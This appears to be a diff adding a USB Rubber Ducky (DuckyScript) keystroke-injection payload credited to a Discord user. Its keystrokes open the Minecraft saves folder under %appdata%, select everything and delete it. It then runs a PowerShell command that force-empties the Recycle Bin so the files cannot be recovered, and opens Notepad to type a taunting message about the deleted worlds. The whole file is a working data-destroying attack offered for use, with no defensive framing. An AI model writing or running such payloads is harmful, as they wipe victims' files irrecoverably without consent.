@@ -1,0 +1,46 @@
+REM CREDITS: keyboard/"tenor_." on discord.
+DELAY 500
+GUI r
+DELAY 400
+STRING %appdata%
+ENTER
+
+DELAY 500
+STRING .
+DELAY 100
+ENTER
+
+DELAY 500
+STRING s
+DELAY 50
+STRING a
+DELAY 50
+STRING v
+DELAY 50
+ENTER
+DELAY 60
+CTRL a
+DELAY 50
+DELETE
+DELAY 2500
+ALT F4
+DELAY 200
+
+GUI r
+DELAY 400
+STRING PowerShell
+ENTER
+
+DELAY 500
+STRING gci C:\`$recycle.bin -force | remove-item -recurse -force
+ENTER
+
+DELAY 500
+STRING exit
+DELAY 200
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+STRINGLN Deleted All Your Minecraft Worlds Lol. Sorry My Guy.
